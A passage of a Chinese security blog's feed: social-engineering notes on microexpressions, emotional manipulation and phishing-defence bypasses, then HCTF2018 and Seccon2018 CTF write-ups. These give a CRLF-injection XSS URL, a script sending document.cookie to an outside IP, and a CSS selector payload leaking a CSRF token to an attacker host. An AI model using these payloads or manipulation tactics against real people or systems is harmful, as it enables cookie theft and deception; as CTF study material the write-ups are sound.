罩住眼睛：情绪激动（悲伤、愤怒），阻止视觉刺激</p></li><li><p>头部<br>  倾斜头部：开放，信任（伴随微笑）</p></li><li><p>胸部<br>  双臂交叉环胸：自我安慰（紧张）</p></li></ul></li><li><p>RSVP<br>  节奏Rhythm/语速Speed/音量Volume/音高Pitch<br>  代词的变化（语言风格）<br>  口吃和用词重复的增加（语言风格）——忧虑、压力<br>  声调的变化——情绪<br>  不做正面答复<br>  停顿——认知负荷，通常伴随眼部动作</p></li></ul><hr><h2 id="人际距离学"><a href="#人际距离学" class="headerlink" title="人际距离学"></a>人际距离学</h2><p>对周围空间的使用方式</p><ul><li>公共空间<br>  说话，听众<br>  4～8米</li><li>社交空间<br>  适用于社交场合<br>  1.2～3米</li><li>私人空间<br>  同家人或朋友互动<br>  0.6～1.2米</li><li>亲密空间<br>  可以亲密接触的人<br>  小于0.3米</li></ul><hr><h2 id="触摸"><a href="#触摸" class="headerlink" title="触摸"></a>触摸</h2><p>在交流过程中传递情感，并建立信任感（建立和谐的氛围）</p><hr><h2 id="眼神交流"><a href="#眼神交流" class="headerlink" title="眼神交流"></a>眼神交流</h2><p>观察他人的情绪状态</p><hr><h2 id="嗅觉学"><a href="#嗅觉学" class="headerlink" title="嗅觉学"></a>嗅觉学</h2><p>触发人们对人，事，物的回忆和情感</p><hr><h2 id="着装"><a href="#着装" class="headerlink" title="着装"></a>着装</h2><p>着装认知：服装的象征意义和身体穿着体验的共存</p><hr><h2 id="面部表情"><a href="#面部表情" class="headerlink" title="面部表情"></a>面部表情</h2><blockquote><p>宏表情：2～4秒，有意识，可控<br>微表情：0.04～0.2秒，无意识，不可控</p></blockquote><p>注意：不要将自己的情绪加入到观察的情绪中</p><ul><li><p>热点（Hotspot）<br>  与言行不一致的微表情或其他表现<br>  当发现热点的时候，开始寻找出现热点的原因，不要只关注一种可能性，通过“对立假设”思考热点出现的原因，增加客观性<br>  做一个积极的聆听者和观察者，不要只关注一件事（面部、肢体语言、嗓音、声线、声音内容）<br>  不要急于作出判断，充分利用所有可利用的时间、语言、非语言线索<br>  注意所有出现的热点，但是在跟进、挑战或对峙时要有选择的利用热点<br>  不要假定目标为什么会出现那种情绪，而是通过问题、基准太和访问策略深入研究情绪的成因</p></li><li><p>情绪<br>  一种受人们自己的过去影响的过程和特定的自我评价<br>  大脑基于之前的经历和生物活动而形成的一组心里原则，用来处理当前所遇到的任何情况</p></li></ul><p>七种基本情绪：恐惧，惊讶，悲伤，轻视，厌恶，愤怒，开心</p><ul><li><p>恐惧<br>  恐惧经常被用来诱导目标至特定的反应和动作<br>  也可以将恐惧重定向到其他情绪</p><ul><li>特征<br>  瞪大双眼，挑起眉毛，嘴唇同时向耳朵拉起，上眼皮抬起，露出虹膜上方的眼白</li><li>练习<ol><li>尽量抬高上眼睑，同时尽量收紧下眼睑</li><li>水平咧开嘴巴，嘴唇水平伸展</li><li>在收紧上眼睑的时候抬高眼眉，露出虹膜上方的眼白，头向后仰</li></ol></li><li>或战或逃<br>  因为紧张而倒吸一口气或尖叫，头和身体也向后退，远离害怕的东西</li></ul></li><li><p>惊讶<br>  眼睛比恐惧时更放松，眼眉的拱形和扬起的程度更大，嘴唇垂直拉起而不是水平</p><ul><li>特征<br>  眉毛上扬，下颚张开，双眼睁大，</li><li>练习<ol><li>在扬起眉毛的同时尽量睁大眼睛</li><li>下巴微微分开</li></ol></li><li>通路情绪<br>  使人们先退到一边，意识到安全后再走近让人们意外的东西，身体也会倾向于那个带来惊讶的物品-&gt;开心，微笑</li></ul></li><li><p>悲伤<br>  可能会使用虚假的微笑或坚韧的眼神隐藏悲伤，凝视正前方，面容呆滞<br>  在极度悲伤时嘴巴会张开的更大<br>  营造悲伤的气氛，激发人们采取某些行动——利用同情心</p><ul><li>特征<br>  最佳下列，上眼睑下垂，外嘴角下斜，眉毛内侧上扬，眉头抬起向中间聚拢，双目低垂，嘴角下垂，下唇中心向外突出</li><li>练习<ol><li>嘴角下拉（嘴巴张开或不张开）</li><li>上抬脸颊</li><li>上眼睑下垂，向下看</li><li>头部向下，前颚紧绷</li><li>眼眉内角皱在一起</li></ol></li></ul></li><li><p>轻视<br>  对那些在道义或社交上逊于自己的个人或群体的情感反应<br>  将轻视的对象排挤出自己的社交团体或阶层<br>  通常会伴随愤怒<br>  当嘴和脸颊的一侧抬起后，往往会产生假笑，点头或仰起头，表现自大</p><ul><li>特征<br>  皱起的鼻子，上启的嘴唇，通常只出现在脸的一侧，眼部不对称，一侧脸颊上抬，嘴部不对称，下巴上抬</li><li>练习<ol><li>扬起一侧的脸，仿佛脸颊挤压导致眯眼</li><li>扬起下巴，为了俯视轻蔑对象</li><li>颊肌抬起，脸部同侧的唇角会产生不对称上扬</li></ol></li></ul></li><li><p>厌恶<br>  通常伴随愤怒、不满、不安与急躁</p><ul><li>特征<br>  上唇上启，漏出牙齿，鼻子皱成一团，双颊上移</li><li>练习<ol><li>皱鼻（鼻梁）</li><li>嘴唇卷起来，有时也会张开并露出牙齿（上牙）</li><li>脸颊出现大幅褶皱</li><li>眉头紧锁</li></ol></li></ul></li><li><p>愤怒<br>  愤怒时无法清晰思考（杏仁核劫持）</p><ul><li>特征<br>  紧抿双唇，眉头紧锁，双眼圆瞪</li><li>练习<ol><li>拉低眉毛（有时会皱起来）</li><li>尝试瞪眼</li><li>紧紧挤压嘴唇，咬紧牙齿，收紧下颚</li><li>下巴通常收紧以保护颈部</li><li>呼吸粗重，变得紧张，心跳加快</li></ol></li></ul></li><li><p>开心</p><ul><li>真诚的微笑（易传染）<br>  颧骨和眼轮匝肌的肌肉分别带动嘴角和脸颊肌肉提起，形成鱼尾纹</li><li>礼貌的微笑（社交微笑）<br>  眼睛没有明显变化</li><li>练习<ol><li>扬起嘴角，抬高脸颊，嘴唇上啦</li><li>不眯眼睛，提高脸颊，将下眼睑上推，形成鱼尾纹</li></ol></li></ul></li><li><p>利用</p><ul><li>情景诱导<br>  通过情绪上的微妙暗示操纵他人达到特定的情绪状态</li><li>识别欺骗<br>  矛盾：发现矛盾-&gt;继续挖掘更多信息-&gt;询问矛盾点-&gt;观察微表情<br>  犹豫：通过犹豫（或者重复问题）来拖延时间以编造谎言<br>  行为变化：每次谈到特定的话题可能导致某一特定行为的变化<br>  手势：手势幅度、频率、时长的变化</li></ul></li></ul><h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>以对收件人施加影响或获得个人信息为目的，发送者看似来自权威来源的电子邮件</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>钱</li><li>信息</li><li>政治目的/个人信仰</li></ul><hr><h2 id="手段"><a href="#手段" class="headerlink" title="手段"></a>手段</h2><ul><li>邮件钓鱼</li><li>网站克隆</li><li>电话钓鱼<br>  增加邮件的真实性/直接索取信息</li></ul><hr><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><ul><li>尼日利亚419骗局（预付款骗局）</li><li>金融类<br>  账户有异常登录请求<br>  银行升级在线安全措施<br>  未按时还款或纳税</li><li>社交媒体</li><li>利用公共事件（杏仁核劫持）<br>  贪婪、恐惧、敬畏权威、渴望交流、好奇、同情</li></ul><hr><h2 id="检测特征"><a href="#检测特征" class="headerlink" title="检测特征"></a>检测特征</h2><ul><li>含糊的称呼/签名</li><li>未知的/令人怀疑的网址链接</li><li>未知的/令人怀疑的发送者</li><li>错别字以及语法，拼写和标点符号错误</li><li>不合情理的借口</li></ul><hr><h2 id="钓鱼攻击分类"><a href="#钓鱼攻击分类" class="headerlink" title="钓鱼攻击分类"></a>钓鱼攻击分类</h2><ul><li><p>一级钓鱼攻击</p><ul><li>非指向性问候和结束语</li><li>拼写错误和糟糕的语法</li><li>简易的信息/不太可能成立的理由</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址/未知的发件人</li></ul></li><li><p>二级钓鱼攻击</p><ul><li>非指向性问候和结束语</li><li>拼写正确但是有一些语法问题</li><li>信息更加复杂但仍然很基本</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址/未知的发件人</li></ul></li><li><p>三级钓鱼攻击</p><ul><li>指向性问候和结束语</li><li>正确的拼写和不错的语法</li><li>复杂的信息，会引起恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>有时候会出现奇怪的邮件地址，但是发件人合法</li><li>很多时候会出现商标</li></ul></li><li><p>四级钓鱼攻击</p><ul><li>鱼叉式钓鱼攻击<br>  针对特定目标进行个人定制</li><li>OSINT<br>  Open-source intelligence（获取开放性情报）</li></ul></li></ul><hr><h2 id="心理学原理"><a href="#心理学原理" class="headerlink" title="心理学原理"></a>心理学原理</h2><ul><li><p>决策</p><ol><li>决策的好坏并不总是与我们对这个决策本身是否感到满意有关</li><li>决策包含了一系列因素，例如我们的看法和情绪</li><li>我们每天都在作出或大或小的决策，即使在并不具备所需要的全部相关信息下</li><li>我们不假思索的，频繁的作出这些或大或小的决策</li></ol></li><li><p>影响因素</p><ul><li>认知偏差<br>  通常源于过去的经验<ul><li>框架效应<br>  反应依赖语境</li><li>可用性启发法<br>  依赖于我们容易想起的事物</li><li>确认偏误<br>  倾向于寻找支持自己观点的信息—偏执</li></ul></li><li>生理状态<br>  饥饿、困倦、疲劳等负面的身体状态</li><li>外部因素<br>  环境、形势的不确定性</li></ul></li><li><p>基础决策模型<br>  定义问题（正确理解问题）-&gt;收集信息-&gt;权衡选择-&gt;作出决策-&gt;评估结果</p></li><li><p>情绪化决策（杏仁核劫持）<br>  基于情绪的钓鱼攻击-&gt;引起大脑和身体反应-&gt;情绪战胜逻辑-&gt;缺乏理性导致错误决策-&gt;产生情绪化行为</p></li><li><p>影响与操控<br>  决策的催化剂</p></li></ul><hr><h2 id="保护与绕过"><a href="#保护与绕过" class="headerlink" title="保护与绕过"></a>保护与绕过</h2><ul><li><p>批判性思维<br>  告诉自己不要事都信以为真<br>  绕过：利用情绪阻止批判性思维-&gt;杏仁核劫持</p></li><li><p>悬停<br>  把鼠标悬停在连接上<br>  绕过：购买看似合法的域名</p></li><li><p>URL解析<br>  绕过：购买看似合法的域名</p></li><li><p>分析邮件头<br>  绕过：对网络进行渗透，获取SMTP服务器</p></li></ul><table><thead><tr><th>邮件头</th><th>解释</th></tr></thead><tbody><tr><td>To</td><td>发送至</td></tr><tr><td>Reply-To</td><td>回复至</td></tr><tr><td>Delivered-To</td><td>已发送至</td></tr><tr><td>X-Received</td><td>邮件来源</td></tr><tr><td>Return-Path</td><td>返回路径</td></tr><tr><td>Received-Spf</td><td>发件人SPF</td></tr><tr><td>Authentication-Results</td><td>身份认证结果</td></tr><tr><td>Dkim-Signature</td><td>DKIM签名</td></tr><tr><td>Domainkey-Signature</td><td>域名密钥签名</td></tr><tr><td>Message-Id</td><td>信息编号</td></tr><tr><td>List-Unsubscribe</td><td>退订信息</td></tr><tr><td>Mime-Version</td><td>MIME版本</td></tr><tr><td>Content-Type</td><td>内容类型</td></tr></tbody></table><ul><li>沙盒<br>  创建一个可以运行未经检测或不受信任的代码的环境</li></ul>]]></content>
    
    
    <summary type="html">社会工程学是一种操纵他人采取特定行动的行为，该行动不一定符合目标的最佳利益，其结果包括获取信息，取得访问权限或者让目标采取特定的行动。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="SocialEngineering" scheme="https://srpopty.github.io/tags/SocialEngineering/"/>
    
  </entry>
  
  <entry>
    <title>针对某三流安全公司的渗透</title>
    <link href="https://srpopty.github.io/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/"/>
    <id>https://srpopty.github.io/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/</id>
    <published>2019-01-27T10:51:10.000Z</published>
    <updated>2021-07-31T13:01:10.208Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="Wrong password hash!"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Enter password here." /><label>Enter password here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="b0baee7f1dcd102a486a5588856210eb13e0bad41ecb806d14d08cc29fa4aff6"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">针对某三流安全公司的渗透过程</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="SocialEngineering" scheme="https://srpopty.github.io/tags/SocialEngineering/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018 Bottle Writeup</title>
    <link href="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/"/>
    <id>https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/</id>
    <published>2018-11-12T12:23:58.000Z</published>
    <updated>2020-08-11T08:44:44.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: *&#x2F;3 *&#x2F;10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http:&#x2F;&#x2F;bottle.2018.hctf.io</span><br></pre></td></tr></table></figure><p>后端是个python，根据题目可知这个应用使用了bottle框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p><p>登录与注册的时候发现中间经过了一个path跳转<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p><p>bottle框架比较出名一点的漏洞是HTTP头注入漏洞(CVE-2016-9964)<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png"></p><p>在path跳转时可进行CRLF注入<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png"></p><p>所以思路是利用CRLF注入，将XSS内容写入到body中，将这个网址提交给管理员，管理员访问这个网址，触发XSS达到cookie</p><p>这里有一个问题:当浏览器发现Location可以跳转时，将不会对body中的HTML进行渲染而直接跳转，只有Location为空时才不会跳转。但是此题中Location又不能为空(会500)，因此当管理员访问这个网址时肯定会跳转。不过Hint中提到”bot use firefoxDriver”，而在FireFox中，当Location目标网址的端口小于80时不会对Location跳转</p><p>因此构造网址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript%3Ea&#x3D;1%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>注意到题目中还设置了CSP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>后来出题人再修复此题之后将CSP放在了CRLF注入点的下面，这样就可以直接把CSP挤到body中，浏览器便不会解析CSP</p><p>在本地FireFox中测试<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"><br>这里不使用alert测试是因为当URL中存在引号或括号时会500</p><p>于是将script的src指向自己服务器的js文件即可任意XSS，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript+src&#x3D;http:&#x2F;&#x2F;srpopty.cn&#x2F;1.js%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ajax.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://123.206.86.208/xss/&quot;</span>+<span class="built_in">document</span>.cookie,<span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.send();</span><br></pre></td></tr></table></figure><p>拿到管理员的cookie<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png"></p><p>修改cookie登录拿到flag<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>]]></content>
    
    
    <summary type="html">HCTF2018 bottle writeup.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Seccon2018 GhostKingdom Writeup</title>
    <link href="https://srpopty.github.io/2018/10/28/Seccon2018-GhostKingdom-Writeup/"/>
    <id>https://srpopty.github.io/2018/10/28/Seccon2018-GhostKingdom-Writeup/</id>
    <published>2018-10-28T07:23:58.000Z</published>
    <updated>2020-08-11T08:44:16.617Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GhostKindom"><a href="#GhostKindom" class="headerlink" title="GhostKindom"></a>GhostKindom</h1><p>网站最开始登陆以后只有两个功能，给admin发送消息以及对指定url地址的网页截屏，第三个upload image功能需要在本地登录后才知道url地址</p><p>首先尝试截屏功能有没有ssrf，发现127.0.0.1这类的地址被过滤了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231049.png"></p><p>于是更改127.0.0.1的格式为2130706433，原理是将点分十进制的ip地址转换为十进制的ip地址，它们本质上是一样的</p><p>发现可以访问127.0.0.1的网址，但是需要登录<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231307.png"></p><p>但是这个网站在登录与注册时，所提交的用户名和密码都是用get方式的，所以可以用get登录，在截屏的目标url中填入<br><code>http://2130706433/?user=username&amp;pass=password&amp;action=login</code><br>即可登录成功，服务器会自动记录session，所以只需登录一次，下次截屏时就能访问其他的网页了</p><p>可以看到通过截屏可以访问upload image，但是却不知道upload image的url地址，所以现在的目标就是获取upload image的地址<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027232032.png"></p><p>这个网站还有另一个功能，可以给admin留言，但是经过测试发现并没有留言功能，但是在留言之前可以预览自己的留言，而这里可以进行css的注入<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/IYF7PP3R055_66RTM9M3CX.png"></p><p>“c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9”经过base64解码后就是”span{background-color:red;color:yellow}”，所以这里的css是可以控制的</p><p>注意到一个csrf参数，可以看到csrf的值就是cookie的值<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/SUGQFXO7YMRUAG9LHT.png"></p><p>所以这里可以利用css来获取源码中的csrf值，也就是cookie，于是思路如下：<br>先利用截屏功能的ssrf登录，使服务器端获取到一个cookie，之后在截屏的ssrf中的预览留言的界面用css获取到csrf的值，拿到在127.0.0.1登录的账号的cookie，劫持以后就可以获取upload image的url了</p><p>在预览界面的html如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span></span></span><br><span class="line"><span class="meta"><span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;ja&quot;</span> <span class="attr">xml:lang</span>=<span class="string">&quot;ja&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>SECCON 2018<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;black&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">h2</span>&#123;<span class="attribute">border</span>:double <span class="number">#668ad8</span>;<span class="attribute">border-width</span>:<span class="number">6px</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">color</span>:<span class="number">#668ad8</span>&#125; <span class="selector-class">.main</span>&#123;<span class="attribute">background-color</span>:<span class="number">#e1e1e1</span>;<span class="attribute">color</span>:black;<span class="attribute">width</span>:<span class="number">85%</span>;<span class="attribute">padding</span>:<span class="number">60px</span>;<span class="attribute">margin</span>:<span class="number">40px</span> auto;<span class="attribute">border</span>:<span class="number">2px</span> solid <span class="number">#C6B665</span>&#125;<span class="selector-class">.msg</span>&#123;<span class="attribute">padding</span>:<span class="number">15px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid black&#125; <span class="selector-class">.ok</span>&#123;<span class="attribute">color</span>:blue&#125; <span class="selector-class">.warn</span>&#123;<span class="attribute">color</span>:orange&#125; <span class="selector-class">.err</span>&#123;<span class="attribute">color</span>:red&#125; <span class="selector-class">.green</span>&#123;<span class="attribute">background-color</span>:lightgreen&#125; <span class="selector-class">.btn</span>&#123;<span class="attribute">background</span>:<span class="number">#668ad8</span>;<span class="attribute">color</span>:white;<span class="attribute">padding</span>:<span class="number">0.5em</span>;<span class="attribute">margin</span>:<span class="number">10px</span>&#125; <span class="selector-class">.sshot</span>&#123;<span class="attribute">border</span>:<span class="number">2px</span> solid white&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;seccon2018_logo.png&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;?&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">span</span>&#123;<span class="attribute">background-color</span>:red;<span class="attribute">color</span>:yellow&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;msg&quot;</span>&gt;</span>Message: 1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;da2b6930fb2a34afefb268&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;msgadm3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send to admin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关于使用css获取数据，payload如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=a&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;c&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=c&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;d&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=d&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;e&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=e&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;f&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=f&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;0&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=0&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;1&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=1&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;2&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=2&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;3&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=3&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;4&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=4&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;5&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=5&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;6&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=6&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;7&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=7&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span 